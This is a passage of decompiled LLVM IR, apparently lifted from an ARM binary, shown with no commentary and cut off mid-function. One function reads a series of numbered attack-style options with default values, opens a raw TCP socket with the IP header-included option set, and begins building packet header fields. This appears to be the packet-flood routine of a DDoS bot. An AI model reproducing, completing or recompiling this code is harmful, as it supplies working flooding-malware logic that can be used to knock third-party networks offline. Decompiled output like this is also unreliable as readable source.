  %v0_9508 = load i32, i32* %r2.global-to-local, align 4
  %v1_9508 = trunc i32 %v0_9508 to i8
  %v2_9508 = load i32, i32* %r4.global-to-local, align 4
  %v3_9508 = inttoptr i32 %v2_9508 to i8*
  store i8 %v1_9508, i8* %v3_9508, align 1
  %v2_950c = call i32* @calloc(i32 %v1_94f8, i32 %v0_94fc)
  %v4_950c = ptrtoint i32* %v2_950c to i32
  %v2_9510 = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_9510 = zext i8 %v2_9510 to i32
  store i32 ptrtoint (i32* @global_var_b97c.93 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_950c, i32* %r5.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v3_9520 = mul nuw nsw i32 %v3_9510, 4
  store i32 %v3_9520, i32* %r1.global-to-local, align 4
  %v2_9524 = load i32, i32* @global_var_1a6bc.77, align 4
  store i32 ptrtoint (i32* @global_var_b97c.93 to i32), i32* %v2_950c, align 4
  %v0_952c = load i32, i32* %r3.global-to-local, align 4
  %v1_952c = trunc i32 %v0_952c to i8
  %v2_952c = load i32, i32* %r5.global-to-local, align 4
  %v3_952c = add i32 %v2_952c, 4
  %v4_952c = inttoptr i32 %v3_952c to i8*
  store i8 %v1_952c, i8* %v4_952c, align 1
  %v0_9530 = load i32, i32* %r1.global-to-local, align 4
  %v1_9530 = add i32 %v0_9530, 4
  store i32 %v1_9530, i32* %r1.global-to-local, align 4
  %v4_9534 = inttoptr i32 %v2_9524 to i32*
  %v5_9534 = call i32* @realloc(i32* %v4_9534, i32 %v1_9530)
  %v7_9534 = ptrtoint i32* %v5_9534 to i32
  %v2_9538 = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_9538 = zext i8 %v2_9538 to i32
  store i32 %v3_9538, i32* %r3.global-to-local, align 4
  store i32 %v7_9534, i32* %ip.global-to-local, align 4
  %v0_9540 = load i32, i32* %r5.global-to-local, align 4
  %v5_9540 = mul nuw nsw i32 %v3_9538, 4
  %v6_9540 = add i32 %v5_9540, %v7_9534
  %v7_9540 = inttoptr i32 %v6_9540 to i32*
  store i32 %v0_9540, i32* %v7_9540, align 4
  %v0_9544 = load i32, i32* %r3.global-to-local, align 4
  %v1_9544 = load i32, i32* %r8.global-to-local, align 4
  %v2_9544 = add i32 %v1_9544, %v0_9544
  store i32 %v2_9544, i32* %r2.global-to-local, align 4
  %v0_9548 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_9548, i32* %r1.global-to-local, align 4
  %v0_9550 = load i32, i32* %ip.global-to-local, align 4
  %v1_9550 = load i32, i32* %r6.global-to-local, align 4
  %v2_9550 = inttoptr i32 %v1_9550 to i32*
  store i32 %v0_9550, i32* %v2_9550, align 4
  %v0_9554 = load i32, i32* %r2.global-to-local, align 4
  %v1_9554 = trunc i32 %v0_9554 to i8
  %v2_9554 = load i32, i32* %r4.global-to-local, align 4
  %v3_9554 = inttoptr i32 %v2_9554 to i8*
  store i8 %v1_9554, i8* %v3_9554, align 1
  %v2_9558 = call i32* @calloc(i32 %v1_9544, i32 %v0_9548)
  %v4_9558 = ptrtoint i32* %v2_9558 to i32
  %v2_955c = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_955c = zext i8 %v2_955c to i32
  store i32 ptrtoint (i32* @global_var_b100.95 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_9558, i32* %r5.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v3_956c = mul nuw nsw i32 %v3_955c, 4
  store i32 %v3_956c, i32* %r1.global-to-local, align 4
  %v2_9570 = load i32, i32* @global_var_1a6bc.77, align 4
  store i32 ptrtoint (i32* @global_var_b100.95 to i32), i32* %v2_9558, align 4
  %v0_9578 = load i32, i32* %r3.global-to-local, align 4
  %v1_9578 = trunc i32 %v0_9578 to i8
  %v2_9578 = load i32, i32* %r5.global-to-local, align 4
  %v3_9578 = add i32 %v2_9578, 4
  %v4_9578 = inttoptr i32 %v3_9578 to i8*
  store i8 %v1_9578, i8* %v4_9578, align 1
  %v0_957c = load i32, i32* %r1.global-to-local, align 4
  %v1_957c = add i32 %v0_957c, 4
  store i32 %v1_957c, i32* %r1.global-to-local, align 4
  %v4_9580 = inttoptr i32 %v2_9570 to i32*
  %v5_9580 = call i32* @realloc(i32* %v4_9580, i32 %v1_957c)
  %v7_9580 = ptrtoint i32* %v5_9580 to i32
  %v2_9584 = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_9584 = zext i8 %v2_9584 to i32
  store i32 %v3_9584, i32* %r3.global-to-local, align 4
  store i32 %v7_9580, i32* %ip.global-to-local, align 4
  %v0_958c = load i32, i32* %r5.global-to-local, align 4
  %v5_958c = mul nuw nsw i32 %v3_9584, 4
  %v6_958c = add i32 %v5_958c, %v7_9580
  %v7_958c = inttoptr i32 %v6_958c to i32*
  store i32 %v0_958c, i32* %v7_958c, align 4
  %v0_9590 = load i32, i32* %r3.global-to-local, align 4
  %v1_9590 = load i32, i32* %r8.global-to-local, align 4
  %v2_9590 = add i32 %v1_9590, %v0_9590
  store i32 %v2_9590, i32* %r2.global-to-local, align 4
  %v0_9594 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_9594, i32* %r1.global-to-local, align 4
  %v0_959c = load i32, i32* %ip.global-to-local, align 4
  %v1_959c = load i32, i32* %r6.global-to-local, align 4
  %v2_959c = inttoptr i32 %v1_959c to i32*
  store i32 %v0_959c, i32* %v2_959c, align 4
  %v0_95a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_95a0 = trunc i32 %v0_95a0 to i8
  %v2_95a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_95a0 = inttoptr i32 %v2_95a0 to i8*
  store i8 %v1_95a0, i8* %v3_95a0, align 1
  %v2_95a4 = call i32* @calloc(i32 %v1_9590, i32 %v0_9594)
  %v4_95a4 = ptrtoint i32* %v2_95a4 to i32
  %v2_95a8 = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_95a8 = zext i8 %v2_95a8 to i32
  store i32 43140, i32* %r2.global-to-local, align 4
  store i32 %v4_95a4, i32* %r5.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v3_95b8 = mul nuw nsw i32 %v3_95a8, 4
  store i32 %v3_95b8, i32* %r1.global-to-local, align 4
  %v2_95bc = load i32, i32* @global_var_1a6bc.77, align 4
  store i32 43140, i32* %v2_95a4, align 4
  %v0_95c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_95c4 = trunc i32 %v0_95c4 to i8
  %v2_95c4 = load i32, i32* %r5.global-to-local, align 4
  %v3_95c4 = add i32 %v2_95c4, 4
  %v4_95c4 = inttoptr i32 %v3_95c4 to i8*
  store i8 %v1_95c4, i8* %v4_95c4, align 1
  %v0_95c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_95c8 = add i32 %v0_95c8, 4
  store i32 %v1_95c8, i32* %r1.global-to-local, align 4
  %v4_95cc = inttoptr i32 %v2_95bc to i32*
  %v5_95cc = call i32* @realloc(i32* %v4_95cc, i32 %v1_95c8)
  %v7_95cc = ptrtoint i32* %v5_95cc to i32
  %v2_95d0 = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_95d0 = zext i8 %v2_95d0 to i32
  store i32 %v3_95d0, i32* %r3.global-to-local, align 4
  store i32 %v7_95cc, i32* %ip.global-to-local, align 4
  %v0_95d8 = load i32, i32* %r5.global-to-local, align 4
  %v5_95d8 = mul nuw nsw i32 %v3_95d0, 4
  %v6_95d8 = add i32 %v5_95d8, %v7_95cc
  %v7_95d8 = inttoptr i32 %v6_95d8 to i32*
  store i32 %v0_95d8, i32* %v7_95d8, align 4
  %v0_95dc = load i32, i32* %r3.global-to-local, align 4
  %v1_95dc = load i32, i32* %r8.global-to-local, align 4
  %v2_95dc = add i32 %v1_95dc, %v0_95dc
  store i32 %v2_95dc, i32* %r2.global-to-local, align 4
  %v0_95e0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_95e0, i32* %r1.global-to-local, align 4
  %v0_95e8 = load i32, i32* %ip.global-to-local, align 4
  %v1_95e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_95e8 = inttoptr i32 %v1_95e8 to i32*
  store i32 %v0_95e8, i32* %v2_95e8, align 4
  %v0_95ec = load i32, i32* %r2.global-to-local, align 4
  %v1_95ec = trunc i32 %v0_95ec to i8
  %v2_95ec = load i32, i32* %r4.global-to-local, align 4
  %v3_95ec = inttoptr i32 %v2_95ec to i8*
  store i8 %v1_95ec, i8* %v3_95ec, align 1
  %v2_95f0 = call i32* @calloc(i32 %v1_95dc, i32 %v0_95e0)
  %v4_95f0 = ptrtoint i32* %v2_95f0 to i32
  %v2_95f4 = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_95f4 = zext i8 %v2_95f4 to i32
  store i32 ptrtoint (i32* @global_var_9e80.98 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_95f0, i32* %r5.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v3_9604 = mul nuw nsw i32 %v3_95f4, 4
  store i32 %v3_9604, i32* %r1.global-to-local, align 4
  %v2_9608 = load i32, i32* @global_var_1a6bc.77, align 4
  store i32 ptrtoint (i32* @global_var_9e80.98 to i32), i32* %v2_95f0, align 4
  %v0_9610 = load i32, i32* %r3.global-to-local, align 4
  %v1_9610 = trunc i32 %v0_9610 to i8
  %v2_9610 = load i32, i32* %r5.global-to-local, align 4
  %v3_9610 = add i32 %v2_9610, 4
  %v4_9610 = inttoptr i32 %v3_9610 to i8*
  store i8 %v1_9610, i8* %v4_9610, align 1
  %v0_9614 = load i32, i32* %r1.global-to-local, align 4
  %v1_9614 = add i32 %v0_9614, 4
  store i32 %v1_9614, i32* %r1.global-to-local, align 4
  %v4_9618 = inttoptr i32 %v2_9608 to i32*
  %v5_9618 = call i32* @realloc(i32* %v4_9618, i32 %v1_9614)
  %v7_9618 = ptrtoint i32* %v5_9618 to i32
  %v2_961c = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_961c = zext i8 %v2_961c to i32
  store i32 %v3_961c, i32* %r3.global-to-local, align 4
  store i32 %v7_9618, i32* %ip.global-to-local, align 4
  %v0_9624 = load i32, i32* %r5.global-to-local, align 4
  %v5_9624 = mul nuw nsw i32 %v3_961c, 4
  %v6_9624 = add i32 %v5_9624, %v7_9618
  %v7_9624 = inttoptr i32 %v6_9624 to i32*
  store i32 %v0_9624, i32* %v7_9624, align 4
  %v0_9628 = load i32, i32* %r3.global-to-local, align 4
  %v1_9628 = load i32, i32* %r8.global-to-local, align 4
  %v2_9628 = add i32 %v1_9628, %v0_9628
  store i32 %v2_9628, i32* %r2.global-to-local, align 4
  %v0_962c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_962c, i32* %r1.global-to-local, align 4
  %v0_9634 = load i32, i32* %ip.global-to-local, align 4
  %v1_9634 = load i32, i32* %r6.global-to-local, align 4
  %v2_9634 = inttoptr i32 %v1_9634 to i32*
  store i32 %v0_9634, i32* %v2_9634, align 4
  %v0_9638 = load i32, i32* %r2.global-to-local, align 4
  %v1_9638 = trunc i32 %v0_9638 to i8
  %v2_9638 = load i32, i32* %r4.global-to-local, align 4
  %v3_9638 = inttoptr i32 %v2_9638 to i8*
  store i8 %v1_9638, i8* %v3_9638, align 1
  %v2_963c = call i32* @calloc(i32 %v1_9628, i32 %v0_962c)
  %v4_963c = ptrtoint i32* %v2_963c to i32
  %v2_9640 = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_9640 = zext i8 %v2_9640 to i32
  store i32 ptrtoint (i32* @global_var_9704.100 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_963c, i32* %r5.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v3_9650 = mul nuw nsw i32 %v3_9640, 4
  store i32 %v3_9650, i32* %r1.global-to-local, align 4
  %v2_9654 = load i32, i32* @global_var_1a6bc.77, align 4
  store i32 ptrtoint (i32* @global_var_9704.100 to i32), i32* %v2_963c, align 4
  %v0_965c = load i32, i32* %r3.global-to-local, align 4
  %v1_965c = trunc i32 %v0_965c to i8
  %v2_965c = load i32, i32* %r5.global-to-local, align 4
  %v3_965c = add i32 %v2_965c, 4
  %v4_965c = inttoptr i32 %v3_965c to i8*
  store i8 %v1_965c, i8* %v4_965c, align 1
  %v0_9660 = load i32, i32* %r1.global-to-local, align 4
  %v1_9660 = add i32 %v0_9660, 4
  store i32 %v1_9660, i32* %r1.global-to-local, align 4
  %v4_9664 = inttoptr i32 %v2_9654 to i32*
  %v5_9664 = call i32* @realloc(i32* %v4_9664, i32 %v1_9660)
  %v7_9664 = ptrtoint i32* %v5_9664 to i32
  %v2_9668 = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_9668 = zext i8 %v2_9668 to i32
  store i32 %v3_9668, i32* %r3.global-to-local, align 4
  store i32 %v7_9664, i32* %ip.global-to-local, align 4
  %v0_9670 = load i32, i32* %r5.global-to-local, align 4
  %v5_9670 = mul nuw nsw i32 %v3_9668, 4
  %v6_9670 = add i32 %v5_9670, %v7_9664
  %v7_9670 = inttoptr i32 %v6_9670 to i32*
  store i32 %v0_9670, i32* %v7_9670, align 4
  %v0_9674 = load i32, i32* %r3.global-to-local, align 4
  %v1_9674 = load i32, i32* %r8.global-to-local, align 4
  %v2_9674 = add i32 %v1_9674, %v0_9674
  store i32 %v2_9674, i32* %r2.global-to-local, align 4
  %v0_9678 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_9678, i32* %r1.global-to-local, align 4
  %v1_9680 = trunc i32 %v2_9674 to i8
  %v2_9680 = load i32, i32* %r4.global-to-local, align 4
  %v3_9680 = inttoptr i32 %v2_9680 to i8*
  store i8 %v1_9680, i8* %v3_9680, align 1
  %v0_9684 = load i32, i32* %ip.global-to-local, align 4
  %v1_9684 = load i32, i32* %r6.global-to-local, align 4
  %v2_9684 = inttoptr i32 %v1_9684 to i32*
  store i32 %v0_9684, i32* %v2_9684, align 4
  %v2_9688 = call i32* @calloc(i32 %v1_9674, i32 %v0_9678)
  %v4_9688 = ptrtoint i32* %v2_9688 to i32
  %v2_968c = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_968c = zext i8 %v2_968c to i32
  store i32 ptrtoint (i32* @global_var_a59c.102 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_9688, i32* %r5.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v3_969c = mul nuw nsw i32 %v3_968c, 4
  store i32 %v3_969c, i32* %r1.global-to-local, align 4
  %v2_96a0 = load i32, i32* @global_var_1a6bc.77, align 4
  store i32 ptrtoint (i32* @global_var_a59c.102 to i32), i32* %v2_9688, align 4
  %v0_96a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_96a8 = trunc i32 %v0_96a8 to i8
  %v2_96a8 = load i32, i32* %r5.global-to-local, align 4
  %v3_96a8 = add i32 %v2_96a8, 4
  %v4_96a8 = inttoptr i32 %v3_96a8 to i8*
  store i8 %v1_96a8, i8* %v4_96a8, align 1
  %v0_96ac = load i32, i32* %r1.global-to-local, align 4
  %v1_96ac = add i32 %v0_96ac, 4
  store i32 %v1_96ac, i32* %r1.global-to-local, align 4
  %v4_96b0 = inttoptr i32 %v2_96a0 to i32*
  %v5_96b0 = call i32* @realloc(i32* %v4_96b0, i32 %v1_96ac)
  %v6_96b0 = ptrtoint i32* %v5_96b0 to i32
  %v2_96b4 = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_96b4 = zext i8 %v2_96b4 to i32
  store i32 %v3_96b4, i32* %r3.global-to-local, align 4
  %v1_96b8 = load i32, i32* %r6.global-to-local, align 4
  %v2_96b8 = inttoptr i32 %v1_96b8 to i32*
  store i32 %v6_96b0, i32* %v2_96b8, align 4
  %v0_96bc = load i32, i32* %r5.global-to-local, align 4
  %v2_96bc = load i32, i32* %r3.global-to-local, align 4
  %v5_96bc = mul i32 %v2_96bc, 4
  %v6_96bc = add i32 %v5_96bc, %v6_96b0
  %v7_96bc = inttoptr i32 %v6_96bc to i32*
  store i32 %v0_96bc, i32* %v7_96bc, align 4
  %v0_96c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_96c0 = load i32, i32* %r8.global-to-local, align 4
  %v2_96c0 = add i32 %v1_96c0, %v0_96c0
  store i32 %v2_96c0, i32* %r2.global-to-local, align 4
  %v1_96c8 = trunc i32 %v2_96c0 to i8
  %v2_96c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_96c8 = inttoptr i32 %v2_96c8 to i8*
  store i8 %v1_96c8, i8* %v3_96c8, align 1
  %v2_96cc = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_96cc, i32* @r4, align 4
  ret i32 %v1_96c0

; uselistorder directives
  uselistorder i32 %v1_96c0, { 1, 0 }
  uselistorder i32 %v1_9674, { 1, 0 }
  uselistorder i32 %v1_9628, { 1, 0 }
  uselistorder i32 %v1_95dc, { 1, 0 }
  uselistorder i32 %v1_9590, { 1, 0 }
  uselistorder i32 %v1_9544, { 1, 0 }
  uselistorder i32 %v1_94f8, { 1, 0 }
  uselistorder i32 %v1_94ac, { 1, 0 }
  uselistorder i32 %v3_9454, { 1, 0, 2 }
  uselistorder i32 %v1_9414, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 0 }
  uselistorder i8* bitcast (i8** @global_var_1a6b8.75 to i8*), { 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_1a6b8.75, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1a6b8.75 to i32), { 1, 0 }
}

define i32 @function_9704(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9704:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-50 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_9704 = load i32, i32* @r4, align 4
  %v6_9704 = load i32, i32* @r5, align 4
  %v9_9704 = load i32, i32* @r6, align 4
  %v12_9704 = load i32, i32* @r7, align 4
  %v15_9704 = load i32, i32* @r8, align 4
  %v21_9704 = load i32, i32* @sl, align 4
  %v1_9708 = urem i32 %arg1, 256
  store i32 %v1_9708, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %v1_9708, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_9720 = urem i32 %arg3, 256
  store i32 %v1_9720, i32* @r4, align 4
  %v2_9724 = call i32* @calloc(i32 %v1_9708, i32 4)
  %v4_9724 = ptrtoint i32* %v2_9724 to i32
  %v0_9728 = load i32, i32* @r5, align 4
  store i32 %v0_9728, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9738 = load i32, i32* @r4, align 4
  store i32 %v0_9738, i32* %r0.global-to-local, align 4
  %v5_973c = inttoptr i32 %v0_9728 to i32*
  %v6_973c = call i32 @function_930c(i32 %v0_9738, i32* %v5_973c, i32 2, i32 0, i32 %v4_9724)
  %v1_9748 = urem i32 %v6_973c, 256
  store i32 %v1_9748, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9754 = load i32, i32* @r5, align 4
  store i32 %v0_9754, i32* %r1.global-to-local, align 4
  %v0_9758 = load i32, i32* @r4, align 4
  store i32 %v0_9758, i32* %r0.global-to-local, align 4
  %v5_975c = trunc i32 %v6_973c to i8
  %v6_9760 = inttoptr i32 %v0_9754 to i32*
  %v7_9760 = call i32 @function_930c(i32 %v0_9758, i32* %v6_9760, i32 3, i32 65535, i32 %v6_973c)
  %v0_9764 = load i32, i32* @r5, align 4
  store i32 %v0_9764, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9760, i32* @r7, align 4
  %v0_9774 = load i32, i32* @r4, align 4
  store i32 %v0_9774, i32* %r0.global-to-local, align 4
  %v5_9778 = inttoptr i32 %v0_9764 to i32*
  %v6_9778 = call i32 @function_930c(i32 %v0_9774, i32* %v5_9778, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_9780 = urem i32 %v6_9778, 256
  store i32 %v1_9780, i32* %ip.global-to-local, align 4
  %v0_9784 = load i32, i32* @r5, align 4
  store i32 %v0_9784, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9790 = load i32, i32* @r4, align 4
  store i32 %v0_9790, i32* %r0.global-to-local, align 4
  %v5_9794 = trunc i32 %v6_9778 to i8
  %v6_9798 = inttoptr i32 %v0_9784 to i32*
  %v7_9798 = call i32 @function_930c(i32 %v0_9790, i32* %v6_9798, i32 5, i32 1, i32 %v6_9778)
  %v1_97a4 = urem i32 %v7_9798, 256
  store i32 %v1_97a4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_97b0 = load i32, i32* @r5, align 4
  store i32 %v0_97b0, i32* %r1.global-to-local, align 4
  %v0_97b4 = load i32, i32* @r4, align 4
  store i32 %v0_97b4, i32* %r0.global-to-local, align 4
  %v5_97bc = inttoptr i32 %v0_97b0 to i32*
  %v6_97bc = call i32 @function_930c(i32 %v0_97b4, i32* %v5_97bc, i32 6, i32 65535, i32 %v1_97a4)
  %v0_97c4 = load i32, i32* @r5, align 4
  store i32 %v0_97c4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_97bc, i32* @sl, align 4
  %v0_97d4 = load i32, i32* @r4, align 4
  store i32 %v0_97d4, i32* %r0.global-to-local, align 4
  %v5_97d8 = inttoptr i32 %v0_97c4 to i32*
  %v6_97d8 = call i32 @function_930c(i32 %v0_97d4, i32* %v5_97d8, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_97dc = load i32, i32* @r5, align 4
  store i32 %v0_97dc, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_97d8, i32* @r8, align 4
  %v0_97ec = load i32, i32* @r4, align 4
  store i32 %v0_97ec, i32* %r0.global-to-local, align 4
  %v5_97f0 = inttoptr i32 %v0_97dc to i32*
  %v6_97f0 = call i32 @function_930c(i32 %v0_97ec, i32* %v5_97f0, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9800 = load i32, i32* @r5, align 4
  store i32 %v0_9800, i32* %r1.global-to-local, align 4
  %v0_9804 = load i32, i32* @r4, align 4
  store i32 %v0_9804, i32* %r0.global-to-local, align 4
  %v5_9808 = inttoptr i32 %v0_9800 to i32*
  %v6_9808 = call i32 @function_930c(i32 %v0_9804, i32* %v5_9808, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_9810 = urem i32 %v6_9808, 256
  store i32 %v1_9810, i32* %ip.global-to-local, align 4
  %v0_9814 = load i32, i32* @r5, align 4
  store i32 %v0_9814, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9820 = load i32, i32* @r4, align 4
  store i32 %v0_9820, i32* %r0.global-to-local, align 4
  %v5_9828 = inttoptr i32 %v0_9814 to i32*
  %v6_9828 = call i32 @function_930c(i32 %v0_9820, i32* %v5_9828, i32 19, i32 0, i32 %v1_9810)
  %v0_9830 = load i32, i32* @r5, align 4
  store i32 %v0_9830, i32* %r1.global-to-local, align 4
  %v2_9834 = load i32, i32* @global_var_1a714.104, align 4
  store i32 %v2_9834, i32* %r3.global-to-local, align 4
  store i32 %v6_9828, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9840 = load i32, i32* @r4, align 4
  store i32 %v0_9840, i32* %r0.global-to-local, align 4
  %v5_9844 = inttoptr i32 %v0_9830 to i32*
  %v6_9844 = call i32 @function_930c(i32 %v0_9840, i32* %v5_9844, i32 25, i32 %v2_9834, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_9858 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_9858, i32* %r0.global-to-local, align 4
  %v2_985c = icmp eq i32 %v3_9858, -1
  store i1 %v2_985c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_985c, label %dec_label_pc_9d40, label %dec_label_pc_9868

dec_label_pc_9868:                                ; preds = %dec_label_pc_9704
  store i32 1, i32* %stack_var_-40, align 4
  %v6_9870 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_9870, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_9884 = call i32 @setsockopt(i32 %v3_9858, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_9884, i32* %r0.global-to-local, align 4
  %v2_9888 = icmp eq i32 %v7_9884, -1
  store i1 %v2_9888, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9888, label %dec_label_pc_9d38, label %dec_label_pc_9890

dec_label_pc_9890:                                ; preds = %dec_label_pc_9868
  %v0_9890 = load i32, i32* @sl, align 4
  %v3_9890 = mul i32 %v0_9890, 65536
  store i32 %v3_9890, i32* %sl.global-to-local, align 4
  %v0_9894 = load i32, i32* @r8, align 4
  %v3_9894 = mul i32 %v0_9894, 65536
  store i32 %v3_9894, i32* %r8.global-to-local, align 4
  %v0_989c = load i32, i32* @r7, align 4
  %v3_989c = mul i32 %v0_989c, 65536
  store i32 %v3_989c, i32* %r7.global-to-local, align 4
  %v0_98a0 = load i32, i32* @r6, align 4
  %v1_98a0 = urem i32 %v0_98a0, 256
  store i32 %v1_98a0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v3_98a8 = urem i32 %v0_989c, 65536
  store i32 %v3_98a8, i32* %r2.global-to-local, align 4
  %v3_98ac = urem i32 %v0_9890, 65536
  store i32 %v3_98ac, i32* %r3.global-to-local, align 4
  %v3_98b0 = urem i32 %v0_9894, 65536
  store i32 %v3_98b0, i32* %r1.global-to-local, align 4
  %v0_98b4 = load i32, i32* @fp, align 4
  %v2_98b4 = icmp eq i32 %v0_98b4, 0
  store i1 %v2_98b4, i1* %cpsr_z.global-to-local, align 1
  %tmp86 = icmp slt i32 %v0_98b4, 1
  br i1 %tmp86, label %dec_label_pc_9e60, label %dec_label_pc_98d4

dec_label_pc_98d4:                                ; preds = %dec_label_pc_9890
  %v3_98d8 = mul i32 %v6_97f0, 65536
  %v0_989c.not = or i32 %v0_989c, -65536
  %v1_98e0 = xor i32 %v0_989c.not, 65535
  %v1_98e8 = add i32 %v3_98d8, 4325376
  %v1_98ec = urem i32 %v0_9890, 256
  %v3_98f4 = udiv i32 %v1_98e8, 256
  %v1_98f8 = add i32 %v3_98d8, 524288
  %v1_9900 = add i32 %v3_98d8, 1835008
  %v1_9904 = urem i32 %v0_9894, 256
  %v1_9908 = and i32 %v3_98f4, 65280
  store i32 %v1_9908, i32* %r0.global-to-local, align 4
  %v3_9910 = udiv i32 %v1_9900, 256
  %tmp87 = mul nsw i32 %v1_98e0, 256
  %v1_9928 = and i32 %v3_9910, 65280
  store i32 %v1_9928, i32* %ip.global-to-local, align 4
  %v1_992c = and i32 %tmp87, 65280
  store i32 %v1_992c, i32* %lr.global-to-local, align 4
  %tmp89 = udiv i32 %v1_98e0, 256
  %v4_9918 = sdiv i32 %v1_98e8, 16777216
  %v5_9948 = trunc i32 %tmp89 to i8
  %v3_9954 = mul nuw nsw i32 %v1_98ec, 256
  %v3_995c = ashr i32 %v1_98e8, 31
